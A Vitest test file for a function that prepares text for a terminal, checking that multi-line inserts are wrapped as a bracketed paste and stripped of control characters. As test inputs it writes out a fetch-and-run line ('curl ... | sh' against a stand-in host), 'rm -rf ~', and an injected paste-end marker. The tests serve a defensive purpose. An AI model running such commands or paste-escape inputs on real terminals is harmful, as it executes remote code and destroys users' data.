import { describe, expect, it } from "vitest";
import { terminalPayload } from "./terminalPayload";

const START = "\x1b[200~";
const END = "\x1b[201~";

describe("terminalPayload", () => {
  it("runs a command with a carriage return", () => {
    expect(terminalPayload("npm test\n", true)).toBe("npm test\r");
  });

  it("inserts a single line as typed, with nothing that submits it", () => {
    expect(terminalPayload("ls -la\n", false)).toBe("ls -la");
  });

  it("inserts several lines as one bracketed paste, so none of them runs", () => {
    // Every newline written raw is an Enter: "insert without running"
    // used to run the first line of the block.
    expect(terminalPayload("curl -s https://x/p | sh\necho ok", false)).toBe(
      `${START}curl -s https://x/p | sh\necho ok${END}`,
    );
  });

  it("strips escape and control characters, so a block cannot end the paste or drive the terminal", () => {
    const out = terminalPayload(`a${END}\nrm -rf ~\x03\x04\x15`, false);
    expect(out.startsWith(START)).toBe(true);
    expect(out.endsWith(END)).toBe(true);
    const inner = out.slice(START.length, -END.length);
    // eslint-disable-next-line no-control-regex
    expect(/[\x00-\x08\x0b-\x1f\x7f]/.test(inner)).toBe(false);
  });
});
